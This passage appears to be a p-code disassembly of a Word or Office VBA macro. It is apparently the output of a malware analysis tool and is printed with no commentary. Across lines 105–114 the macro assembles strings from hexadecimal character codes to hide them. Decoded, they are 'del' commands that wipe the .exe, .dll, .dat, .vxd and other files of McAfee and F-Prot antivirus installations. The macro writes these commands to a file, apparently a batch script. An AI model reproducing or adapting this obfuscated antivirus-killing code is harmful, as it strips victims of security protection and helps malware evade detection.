' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St TT$ 
' Line #106:
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St UU$ 
' Line #107:
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St VV$ 
' Line #108:
' 	Ld OO$ 
' 	Ld PP$ 
' 	Concat 
' 	Ld QQ$ 
' 	Concat 
' 	Ld SS$ 
' 	Concat 
' 	Ld TT$ 
' 	Concat 
' 	Ld UU$ 
' 	Concat 
' 	Ld VV$ 
' 	Concat 
' 	St YY$ 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld YY$ 
' 	PrintItemNL 
' Line #109:
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OO$ 
' Line #110:
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PP$ 
' Line #111:
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St QQ$ 
' Line #112:
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St SS$ 
' Line #113:
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St TT$ 
' Line #114:
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
